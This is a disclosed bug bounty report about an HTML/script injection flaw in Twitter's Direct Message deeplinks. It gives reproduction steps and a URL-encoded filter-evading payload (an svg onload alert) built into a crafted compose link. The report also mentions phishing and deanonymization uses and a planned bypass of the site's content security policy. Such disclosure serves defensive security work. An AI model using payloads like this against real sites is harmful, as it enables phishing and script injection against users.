# XSS via Direct Message deeplinks

## Report Details
- **Report ID**: 341908
- **URL**: https://hackerone.com/reports/341908
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-04-23T05:13:18.832Z
- **Disclosed**: 2019-05-09T18:03:28.588Z

## Reporter
- **Username**: 0xsobky
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Description:** 
By using a specially crafted payload as the value of the text parameter in a Direct Message deeplink, a malicious user can inject arbitrary HTML tags and possibly run arbitrary JavaScript code on the "twitter.com" origin.

## Steps To Reproduce:

  1. Create a Direct Message deeplink by following the instructions on this [Twitter developer guide](https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message).
  2. Use the following payload as the value for the text parameter:
```
%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2
```
  3. Tweet the deeplink you created. It should look like the following:
```
https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2
```

## Impact

It seems that the deployed CSP policy currently blocks the execution of arbitrary JavaScript code, however, arbitrary HTML tags can still be injection on `twitter.com` to carry out other kinds of attacks (i.e., deanonymization attacks, phishing, etc.). While you're in the process of verifying this, I'll be working on a bypass for the CSP policy in order to execute arbitrary JavaScript.

The hacker selected the **Cross-site Scripting (XSS) - DOM** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://twitter.com/fvofo0000001444/status/988278372894740480

**Verified**
Yes



## Attachments
- screenshot.png
